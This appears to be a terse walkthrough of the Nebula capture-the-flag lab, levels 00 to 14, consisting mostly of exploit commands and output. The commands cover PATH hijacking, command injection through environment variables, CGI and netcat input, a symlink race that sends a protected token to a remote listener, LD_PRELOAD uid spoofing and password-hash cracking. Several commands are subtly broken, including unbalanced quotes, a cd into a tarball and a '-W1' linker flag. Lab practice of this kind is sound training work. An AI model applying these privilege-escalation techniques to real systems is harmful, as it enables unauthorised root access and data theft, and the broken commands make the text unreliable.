##Nebula##

#Level 00

requires the user to find a setuid file.  find / -perm +6000 -type f -exec ls -ldh {} \; > files.txt and cat files.txt | grep flag00 gives us two files, /bin/.../flag00 and /rofs/bin/.../flag00

#Level 01

$ export PATH=~:$PATH
$ /bin/echo "whoami; getflag" > ~/echo
$ chmod a+x ~/echo
$ /home/flag01/flag01

#Level 02

$ export USER="hi echoing; whoami; getflag"
$ /home/flag02/flag02
about to call system("/bin/echo hi echoing; whoami; getflag is cool")
hi echoing
flag02
You have successfully executed getflag on target account

#Level 03

$ cd /home/flag03
$ ls
writable.d   writable.sh

$ # ./writable.sh runs a for loop with "bash -x $i" for i in writable.d/*
$ echo "whoami" > /tmp/log; getflag >> /tmp/log" > ./writable.d/foo
$ # Wait a few minutes for the cron job
$ cat /tmp/log
flag03
You have successfully executed getflag on target account

#Level 04

$ cd /tmp/
$ ln -s /home/flag04/ ./foo
$ cd /home/flag04/
$ ./flag04 /tmp/foo


#Level 05

$ cd /home/flag05
$ ls -la
$ `/home/flag05` contains `.ssh` (unreadable) and `.backup` (execute access!) directories
$ ls .backup
backup-19072011.tgz
$ # tar tzf backup-19072011.tgz shows that it contains the .ssh directory
$ cd .backup
$ tar xzf backup-19072011.tgz -C ~
$ cd ~/.ssh
$ ssh -i id_rsa flag05@localhost
flag05@nebula:~$ getflag

#Level 06

$ cat /etc/passwd/ |  grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh

$ cd ~
$ wget http://www.openwall.com/john/g/john-1.7.9.tar.gz
$ tar xzf john-1.7.9.tar.gz
$ cd john-1.7.9.tar.gz/src
$ make clean linux-x86-sse2
$ cd ../run
$ ./john /etc/passwd
Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
hello             (flag06)
...
$ su flag06
Password:
sh-4.2$ getflag

#Level 07

$ cd /home/flag07
$ perl index.cgi Host="google.com | getflag"
$ # Yields a "getflag is executing on a non-flag account, this doesn't count"
$ cat thttpd.conf | grep flag07
dir=/home/flag07
user=flag07
$ ps aux | grep thttpd
$ # Interestingly, two thttpd web server instances are running on flag07 and flag16
$ cat thttpd.conf | grep port=
port=7007
$ cd ~ && wget localhost:7007/index.cgi --post-data="Host=google.com | getflag"
$ cat index.cgi
>     html<head><title>Ping results
>     </title></head><body><pre>You have successfully executed getflag on a target accoun thtml



#Level 08

$ cd /home/flag08
$ # -X prints in ASCII; -q removes extraneous information, -r points to a file
$ tcpdump -X -q -r capture.pcap | less
$ # -c prints to stdout, -r points to a file
$ tcpflow -c -r capture.pcap | less
$ su flag08
Password:backd00Rmate
sh-4.2$ getflag


#Level 09

$ cd ~
$ echo "[email {\$use_me(getflag)}]" > foo
$ /home/flag09/flag09 ./foo exec
[error]
You have successfully executed getflag on target account


#Level 10

#!/bin/bash

#!/bin/bash -x
 # upload_file.sh
rm ~/foo
for i in `seq 10000`; do echo "placeholder" >> ~/foo; done
/home/flag10/flag10 ~/foo 192.168.1.6
sleep 0.0001
rm ~/foo; ln -s /home/flag10/token ~/foo

separate run
while true; do ./upload_file.sh; done

#Level 11


$ cd ~
$ echo "Content-Length: 1\n\c" > ./foo
$ echo "getflag; whoami" > ./b
$ export PATH=~:$PATH
$ /home/flag11/flag11 < ~/foo
sh: $'b\200\263': command not found
$ /home/flag11/flag11 < ~/foo
sh: $'b\300\241': command not found
$ /home/flag11/flag11 < ~/foo
You have successfully executed getflag on a target account
flag11


#Level 12


$ nc 127.0.0.1 50001
Password: $(getflag), which is $(whoami) > ~/getflag.log
Better luck next time
$ cat /home/flag12/getflag.log
You have successfully executed getflag on a target account, which is flag12

prog = io.popen("echo "..password.." | sha1sum", "r")


#Level 13

> // custom_uid.c
> #include systypes.h
> 
> uid_t getuid()
> {
> 	return 1000;
> }

$ # Create a shared library
$ cd ~
$ gcc -fPIC -g -c custom_uid.c
$ gcc -shared -W1,-soname,uid.so -o uid.so custom_uid.o -lc
$ ls *.so
uid.so


$ # Preload the shared library
$ export LD_PRELOAD=./uid.so
$ cp /home/flag13/flag13 ~
$ ldd flag13 | grep uid.so
./uid.so (0x001c3000)
$ chmod a+x ~/flag13
$ ~/flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
$ su flag13
sh-4.2$ getflag
You have successfully executed getflag on a target account


$ echo $UID
1014
$ printf '%x\n' 1014 # Our uid in hex
3f6
$ printf '%x\n' 1000 # FAKEUID in hex
3e8
$ objdump -d flag13 | grep 3e8
80484f4:		3d e8 03 00 00		cmp 	__$0x3e8__,%eax
…
$ cp /home/flag13/flag13 ~
$ vim ~/flag13
$ # … Make the substitution described below #

$ ~/flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58

#Level 14

> #!/bin/bash
> # try.sh
> # A helper function for pattern finding
> try()
> {
> 	echo "$@" | /home/flag14/flag14 -e; echo""
> }

$ source ~/try.sh
$ try 1; try @; try a
1
@
a
$ try 0231 # 0 - 0 = 0 | 3 - 2 = 1 | 5 - 3 = 2 |  4 - 1 = 3
0354

> // decrypt.c
> #include <stdio.h>
> #include <string.h>
> 
> int main (int argc, char*argv[])
> {
> 	for (int i = 0; i < strlen(argv[1]); i++)
> 		printf("%c", argv[1][i] - i);
> 	printf("\n");
> }

$ gcc -std=c99 -o decrypt decrypt.c
$ cat /home/flag14/token
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
$ ./decrypt $(cat /home/flag14/token)
8457c118-887c-4e40-a5a6-33a25353165
$ su flag14
Password:
sh4.2$ getflag
You have successfully executed getflag on a target account